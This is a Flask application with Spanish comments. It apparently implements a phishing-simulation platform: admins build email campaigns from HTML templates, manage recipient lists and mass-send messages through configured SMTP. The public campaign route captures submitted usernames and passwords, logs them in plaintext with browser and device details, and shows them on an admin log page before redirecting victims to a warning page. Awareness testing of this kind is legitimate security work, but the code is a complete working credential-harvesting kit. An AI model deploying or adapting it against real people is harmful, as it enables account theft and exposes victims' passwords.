from flask import Flask, render_template, request, redirect, url_for, session, flash
import os
import json
import secrets
import re
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
from flask_wtf import CSRFProtect
from email_sender import init_mail, load_mail_config, save_mail_config, send_campaign_emails

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Genera una clave secreta aleatoria
app.config['SESSION_COOKIE_SECURE'] = True  # Solo envía cookies a través de HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Previene acceso a cookies via JavaScript
app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # Sesión expira después de 30 minutos
app.config['WTF_CSRF_ENABLED'] = True  # Habilita protección CSRF

# Inicializar protección CSRF
csrf = CSRFProtect(app)

# Inicializar Flask-Mail
mail = init_mail(app)
# Cargar configuración de correo si existe
load_mail_config()

UPLOAD_FOLDER = 'campaigns'
LOG_FOLDER = 'logs'
TEMPLATE_FOLDER = 'templates/campaign_templates'
CREDENTIAL_FILE = 'admin_credentials.json'
RECIPIENTS_FOLDER = 'recipients'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)
os.makedirs(TEMPLATE_FOLDER, exist_ok=True)
os.makedirs(RECIPIENTS_FOLDER, exist_ok=True)
os.makedirs('templates/email_templates', exist_ok=True)

# --- Funciones de autenticación ---
def user_exists():
    return os.path.exists(CREDENTIAL_FILE)

def save_credentials(username, password):
    admins = []
    if os.path.exists(CREDENTIAL_FILE):
        with open(CREDENTIAL_FILE, 'r') as f:
            try:
                admins = json.load(f)
            except json.JSONDecodeError:
                admins = []
    # Verifica si el usuario ya existe
    for admin in admins:
        if admin['username'] == username:
            return False  # Usuario ya existe
    admins.append({"username": username, "password": generate_password_hash(password)})
    with open(CREDENTIAL_FILE, 'w') as f:
        json.dump(admins, f)
    return True

def check_credentials(username, password):
    if not user_exists():
        return False
    with open(CREDENTIAL_FILE, 'r') as f:
        try:
            admins = json.load(f)
        except json.JSONDecodeError:
            return False
    for admin in admins:
        if admin['username'] == username and check_password_hash(admin['password'], password):
            return True
    return False

# --- Rutas públicas ---
@app.route('/')
def landing():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not user_exists():
        return redirect(url_for('setup'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if check_credentials(username, password):
            session['user'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Credenciales inválidas")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/setup', methods=['GET', 'POST'])
def setup():
    if user_exists():
        return redirect(url_for('login'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if save_credentials(username, password):
            return redirect(url_for('login'))
        else:
            return render_template('setup.html', error="El usuario ya existe")
    return render_template('setup.html')

# --- Dashboard y campañas (requiere login) ---
def login_required(view_func):
    def wrapped_view(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return view_func(*args, **kwargs)
    wrapped_view.__name__ = view_func.__name__
    return wrapped_view

@app.route('/dashboard')
@login_required
def dashboard():
    templates = os.listdir(TEMPLATE_FOLDER)
    campaigns = [f[:-5] for f in os.listdir(UPLOAD_FOLDER) if f.endswith('.html')]
    return render_template('index.html', templates=templates, campaigns=campaigns)

@app.route('/delete_campaign/<campaign_name>')
@login_required
def delete_campaign(campaign_name):
    # Validación de entrada para prevenir path traversal
    if '/' in campaign_name or '\\' in campaign_name or '..' in campaign_name or any(c in '<>:"|?*' for c in campaign_name):
        flash('Nombre de campaña no válido', 'danger')
        return redirect(url_for('dashboard'))
    
    # Rutas de archivos asociados a la campaña
    campaign_html = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    campaign_info = os.path.join(UPLOAD_FOLDER, f"{campaign_name}_info.json")
    campaign_log = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")
    recipients_file = os.path.join(RECIPIENTS_FOLDER, f"{campaign_name}_recipients.txt")
    
    # Eliminar archivos si existen
    files_to_delete = [campaign_html, campaign_info, campaign_log, recipients_file]
    for file_path in files_to_delete:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except Exception as e:
                flash(f'Error al eliminar {os.path.basename(file_path)}: {str(e)}', 'danger')
    
    flash(f'Campaña "{campaign_name}" eliminada correctamente', 'success')
    return redirect(url_for('dashboard'))

@app.route('/create_campaign', methods=['POST'])
@login_required
def create_campaign():
    campaign_name = request.form['campaign_name']
    
    # Validación del nombre de campaña
    if not campaign_name or len(campaign_name) > 50:
        return "El nombre de campaña no es válido o es demasiado largo", 400
    
    # Prevenir caracteres peligrosos en el nombre de la campaña
    if '/' in campaign_name or '\\' in campaign_name or '..' in campaign_name or any(c in '<>:"|?*' for c in campaign_name):
        return "El nombre de campaña contiene caracteres no permitidos", 400
    
    selected_template = request.form.get('selected_template')
    html_file = request.files.get('html_file')
    sender_email = request.form.get('sender_email', '')
    email_subject = request.form.get('email_subject', '')

    save_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    
    # Guardar información de la campaña para envío de correos
    campaign_info = {
        'name': campaign_name,
        'sender_email': sender_email,
        'subject': email_subject
    }
    
    with open(os.path.join(UPLOAD_FOLDER, f"{campaign_name}_info.json"), 'w') as f:
        json.dump(campaign_info, f)

    if html_file:
        # Validar el tipo de archivo
        if not html_file.filename.endswith('.html'):
            return "Solo se permiten archivos HTML", 400
        html_file.save(save_path)
    elif selected_template:
        # Validar que la plantilla no contenga path traversal
        if '/' in selected_template or '\\' in selected_template or '..' in selected_template:
            return "Plantilla no válida", 400
            
        template_path = os.path.join(TEMPLATE_FOLDER, selected_template)
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as src, open(save_path, 'w', encoding='utf-8') as dst:
                dst.write(src.read())
        else:
            return "Plantilla no encontrada", 400
    else:
        return "Debe seleccionar o subir una plantilla", 400

    return render_template("campaign_created.html", campaign_name=campaign_name)

@app.route('/campana/<campaign_name>', methods=['GET', 'POST'])
def run_campaign(campaign_name):
    # Validación de entrada para prevenir path traversal
    if '/' in campaign_name or '\\' in campaign_name or '..' in campaign_name:
        return "Campaña no válida", 400
        
    campaign_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")

    if not os.path.exists(campaign_path):
        return "Campaña no encontrada", 404

    if request.method == 'POST':
        # Sanitización de entrada
        email = request.form.get('username', 'N/A')
        password = request.form.get('password', 'N/A')
        # Limitar longitud para prevenir ataques de DoS
        email = email[:100] if email else 'N/A'
        password = password[:100] if password else 'N/A'
        timestamp = datetime.now().isoformat()
        
        # Obtener información del navegador y dispositivo
        user_agent = request.headers.get('User-Agent', 'Desconocido')
        user_agent = user_agent[:255] if user_agent else 'Desconocido'  # Limitar longitud
        
        # Escapar caracteres especiales para prevenir inyección CSV
        email = email.replace(',', '&#44;').replace('\n', '')
        password = password.replace(',', '&#44;').replace('\n', '')
        user_agent = user_agent.replace(',', '&#44;').replace('\n', '')
        
        with open(log_path, 'a') as f:
            f.write(f"{email},{password},{timestamp},{user_agent}\n")
        return redirect(url_for('warning'))

    with open(campaign_path, 'r', encoding='utf-8') as f:
        html = f.read()
    return html

@app.route('/warning')
def warning():
    return render_template('warning.html')

# Función para analizar el user-agent y extraer información del dispositivo y navegador
def analizar_user_agent(user_agent_string):
    # Detectar sistema operativo
    sistema_operativo = 'Desconocido'
    if re.search(r'Windows', user_agent_string):
        sistema_operativo = 'Windows'
    elif re.search(r'Android', user_agent_string):
        sistema_operativo = 'Android'
    elif re.search(r'iPhone|iPad|iPod', user_agent_string):
        sistema_operativo = 'iOS'
    elif re.search(r'Mac OS', user_agent_string):
        sistema_operativo = 'macOS'
    elif re.search(r'Linux', user_agent_string):
        sistema_operativo = 'Linux'
    
    # Detectar navegador
    navegador = 'Desconocido'
    if re.search(r'Chrome(?!.*Edge)', user_agent_string):
        navegador = 'Chrome'
    elif re.search(r'Firefox', user_agent_string):
        navegador = 'Firefox'
    elif re.search(r'Safari(?!.*Chrome)', user_agent_string):
        navegador = 'Safari'
    elif re.search(r'Edge', user_agent_string):
        navegador = 'Edge'
    elif re.search(r'MSIE|Trident', user_agent_string):
        navegador = 'Internet Explorer'
    elif re.search(r'Opera|OPR', user_agent_string):
        navegador = 'Opera'
    
    # Detectar si es móvil
    dispositivo = 'Escritorio'
    if re.search(r'Mobile|Android|iPhone|iPad|iPod', user_agent_string):
        dispositivo = 'Móvil/Tablet'
    
    return {
        'sistema_operativo': sistema_operativo,
        'navegador': navegador,
        'dispositivo': dispositivo,
        'user_agent_completo': user_agent_string
    }

@app.route('/logs/<campaign_name>')
@login_required
def view_logs(campaign_name):
    log_path = os.path.join(LOG_FOLDER, f"{campaign_name}_log.txt")
    if not os.path.exists(log_path):
        return "Sin registros para esta campaña."
    
    logs_data = []
    with open(log_path) as f:
        for line in f:
            parts = line.strip().split(',')
            user_agent_string = parts[3] if len(parts) > 3 else 'Desconocido'
            info_dispositivo = analizar_user_agent(user_agent_string)
            
            log_entry = {
                'email': parts[0] if len(parts) > 0 else 'N/A',
                'password': parts[1] if len(parts) > 1 else 'N/A',
                'timestamp': parts[2] if len(parts) > 2 else 'N/A',
                'user_agent': user_agent_string,
                'sistema_operativo': info_dispositivo['sistema_operativo'],
                'navegador': info_dispositivo['navegador'],
                'dispositivo': info_dispositivo['dispositivo']
            }
            logs_data.append(log_entry)
    
    return render_template("logs.html", logs=logs_data, campaign_name=campaign_name)

# --- Verificación de plantillas de campaña ---
def verificar_plantillas_campana():
    plantilla_dir = TEMPLATE_FOLDER
    archivos_html = [f for f in os.listdir(plantilla_dir) if f.endswith('.html')]
    if not archivos_html:
        print('ADVERTENCIA: No se encontraron plantillas .html en templates/campaign_templates')
    else:
        print(f'Se detectaron {len(archivos_html)} plantilla(s) .html en templates/campaign_templates')

verificar_plantillas_campana()

@app.route('/email_config', methods=['GET', 'POST'])
@login_required
def email_config():
    if request.method == 'POST':
        config = {
            'mail_server': request.form.get('mail_server'),
            'mail_port': int(request.form.get('mail_port', 587)),
            'mail_use_tls': request.form.get('mail_use_tls') == 'on',
            'mail_use_ssl': request.form.get('mail_use_ssl') == 'on',
            'mail_username': request.form.get('mail_username'),
            'mail_password': request.form.get('mail_password'),
            'mail_default_sender': request.form.get('mail_default_sender')
        }
        
        if save_mail_config(config):
            flash('Configuración de correo guardada correctamente', 'success')
            # Recargar la configuración
            load_mail_config()
            return redirect(url_for('email_config'))
        else:
            flash('Error al guardar la configuración de correo', 'danger')
    
    # Cargar configuración actual
    config_file = 'mail_config.json'
    config = {}
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            try:
                config = json.load(f)
            except json.JSONDecodeError:
                pass
    
    return render_template('email_config.html', config=config)

@app.route('/recipients/<campaign_name>', methods=['GET', 'POST'])
@login_required
def manage_recipients(campaign_name):
    recipients_file = os.path.join(RECIPIENTS_FOLDER, f"{campaign_name}_recipients.txt")
    
    if request.method == 'POST':
        recipients_text = request.form.get('recipients', '')
        # Guardar los destinatarios
        with open(recipients_file, 'w') as f:
            f.write(recipients_text)
        flash('Lista de destinatarios guardada correctamente', 'success')
    
    # Cargar destinatarios existentes
    recipients = ''
    if os.path.exists(recipients_file):
        with open(recipients_file, 'r') as f:
            recipients = f.read()
    
    return render_template('recipients.html', campaign_name=campaign_name, recipients=recipients)

@app.route('/send_campaign/<campaign_name>', methods=['GET', 'POST'])
@login_required
def send_campaign(campaign_name):
    # Verificar que existe la campaña
    campaign_path = os.path.join(UPLOAD_FOLDER, f"{campaign_name}.html")
    if not os.path.exists(campaign_path):
        flash('La campaña no existe', 'danger')
        return redirect(url_for('dashboard'))
    
    # Verificar que hay configuración de correo
    if not os.path.exists('mail_config.json'):
        flash('Debe configurar los parámetros de correo primero', 'warning')
        return redirect(url_for('email_config'))
    
    # Verificar que hay destinatarios
    recipients_file = os.path.join(RECIPIENTS_FOLDER, f"{campaign_name}_recipients.txt")
    if not os.path.exists(recipients_file):
        flash('Debe agregar destinatarios a la campaña', 'warning')
        return redirect(url_for('manage_recipients', campaign_name=campaign_name))
    
    # Cargar información de la campaña
    campaign_info_file = os.path.join(UPLOAD_FOLDER, f"{campaign_name}_info.json")
    if os.path.exists(campaign_info_file):
        with open(campaign_info_file, 'r') as f:
            campaign_info = json.load(f)
    else:
        campaign_info = {'subject': 'Notificación Importante', 'sender_email': ''}
    
    if request.method == 'POST':
        # Cargar destinatarios
        with open(recipients_file, 'r') as f:
            recipients_text = f.read()
        
        # Filtrar y limpiar correos electrónicos
        recipients = []
        for line in recipients_text.split('\n'):
            email = line.strip()
            if email and '@' in email:
                recipients.append(email)
        
        if not recipients:
            flash('No hay destinatarios válidos', 'danger')
            return redirect(url_for('manage_recipients', campaign_name=campaign_name))
        
        # Enviar correos
        results = send_campaign_emails(
            campaign_name, 
            campaign_info.get('subject', 'Notificación Importante'),
            recipients,
            campaign_info.get('sender_email', '')
        )
        
        # Contar éxitos y fallos
        success_count = sum(1 for r in results if r['success'])
        
        flash(f'Campaña enviada: {success_count} de {len(recipients)} correos enviados correctamente', 'info')
        return redirect(url_for('dashboard'))
    
    return render_template('send_campaign.html', campaign_name=campaign_name, campaign_info=campaign_info)

if __name__ == '__main__':
    app.run(debug=True)